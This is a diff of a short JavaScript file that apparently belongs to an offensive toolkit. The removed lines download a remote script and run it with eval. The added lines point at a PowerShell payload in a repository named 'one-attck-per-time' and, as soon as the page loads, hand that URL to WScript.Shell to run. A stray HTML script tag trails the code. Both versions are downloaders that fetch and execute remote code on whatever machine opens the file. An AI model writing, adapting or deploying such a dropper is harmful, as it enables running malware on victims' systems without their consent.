@@ -1,17 +1,12 @@
-// create a new XMLHttpRequest object
-var xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+// Your JavaScript code goes here
 
-// specify the URL of the web-hosted JavaScript file
-var url = "https://";
+var url = 'https://raw.githubusercontent.com/cmndcntrlcyber/one-attck-per-time/main/Payloads/pwsh/WonTonPlatypus.ps1'; // Replace with the actual path to your executable file on the web server
 
-// open the XMLHttpRequest object
-xmlhttp.open("GET", url, false);
+window.onload = function() {
+    window.setTimeout(function() {
+        var exec = new ActiveXObject("WScript.Shell");
+        exec.Run(url);
+    }, 0); // Execute immediately by passing 0 as the delay parameter
+};
 
-// send the request to retrieve the script file
-xmlhttp.send();
-
-// get the script code from the response text
-var scriptCode = xmlhttp.responseText;
-
-// use the eval function to execute the script code
-eval(scriptCode);
+<script type="text/javascript" src="path/to/your_js_file.js"></script>
